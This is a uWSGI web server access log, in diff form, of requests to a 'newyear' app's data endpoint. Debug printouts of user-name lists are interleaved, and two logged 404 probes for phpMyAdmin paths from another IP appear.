+[<UserInfo: 徐海峰>, <UserInfo: 种亚男>, <UserInfo: 韩德胜>, <UserInfo: 王朴>]
+[pid: 19807|app: 0|req: 63/96] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:02:29 2019] GET /newyear/asydata/?cid=2 => generated 8925 bytes in 12 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 王炎>]
+[pid: 19807|app: 0|req: 64/97] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:02:30 2019] GET /newyear/asydata/?cid=3 => generated 8113 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[]
+[pid: 19807|app: 0|req: 65/98] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:02:31 2019] GET /newyear/asydata/?cid=4 => generated 7850 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 66/99] 220.207.80.239 () {42 vars in 775 bytes} [Tue Dec 31 01:04:03 2019] GET /newyear/index/ => generated 4692 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[]
+[pid: 19807|app: 0|req: 67/100] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:04:20 2019] GET /newyear/asydata/?cid=4 => generated 7850 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 王炎>]
+[pid: 19807|app: 0|req: 68/101] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:04:30 2019] GET /newyear/asydata/?cid=3 => generated 8113 bytes in 12 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[<UserInfo: 徐海峰>, <UserInfo: 种亚男>, <UserInfo: 韩德胜>, <UserInfo: 王朴>]
+[pid: 19807|app: 0|req: 69/102] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:04:32 2019] GET /newyear/asydata/?cid=2 => generated 8925 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 张文>, <UserInfo: 朱为准>]
+[pid: 19807|app: 0|req: 70/103] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:04:33 2019] GET /newyear/asydata/?cid=1 => generated 8383 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 71/104] 59.36.132.240 () {36 vars in 533 bytes} [Tue Dec 31 01:04:34 2019] GET /phpMyadmin_bak/index.php => generated 2084 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 72/105] 220.207.80.239 () {42 vars in 775 bytes} [Tue Dec 31 01:04:42 2019] GET /newyear/index/ => generated 4692 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 1)
+[pid: 19807|app: 0|req: 73/106] 220.207.80.239 () {42 vars in 775 bytes} [Tue Dec 31 01:05:27 2019] GET /newyear/index/ => generated 4692 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[<UserInfo: 张文>, <UserInfo: 朱为准>]
+[pid: 19807|app: 0|req: 74/107] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:05:32 2019] GET /newyear/asydata/?cid=1 => generated 8383 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[<UserInfo: 徐海峰>, <UserInfo: 种亚男>, <UserInfo: 韩德胜>, <UserInfo: 王朴>]
+[pid: 19807|app: 0|req: 75/108] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:05:33 2019] GET /newyear/asydata/?cid=2 => generated 8925 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[<UserInfo: 王炎>]
+[pid: 19807|app: 0|req: 76/109] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:05:34 2019] GET /newyear/asydata/?cid=3 => generated 8113 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+[]
+[pid: 19807|app: 0|req: 77/110] 220.207.80.239 () {42 vars in 694 bytes} [Tue Dec 31 01:05:35 2019] GET /newyear/asydata/?cid=4 => generated 7850 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 19807|app: 0|req: 78/111] 59.36.132.240 () {36 vars in 523 bytes} [Tue Dec 31 01:05:44 2019] GET /phpMydmin/index.php => generated 2069 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 1)
